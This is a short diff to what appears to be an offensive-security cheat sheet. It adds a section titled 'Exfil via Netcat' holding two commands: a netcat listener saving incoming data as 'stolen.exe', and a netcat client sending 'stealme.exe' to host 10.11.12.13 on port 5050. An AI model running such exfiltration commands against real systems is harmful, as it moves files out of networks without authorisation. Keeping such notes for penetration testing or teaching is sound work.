@@ -8,6 +8,7 @@
 ## Table of Contents
 * [Scheduled Tasks](#scheduled-tasks)
   * [Rolling Reboot](#rolling-reboot) 
+* [Exfil via Netcat](#exfil-via-netcat)
 
 ## Scheduled Tasks
 ### Rolling Reboot
@@ -45,5 +46,11 @@ Start-Sleep -Seconds 5
   <a href="/CheatSheets/effect.md">Top of Page</a> |
   <a href="/CheatSheets/effect.md#bottom-of-page">Bottom of Page</a>
 </p>
+
+## Exfil via Netcat
+```bash
+nc -nvlp 5050 > stolen.exe
+nc.exe -w3 10.11.12.13 5050 < stealme.exe
+```
 
 ## Bottom of Page
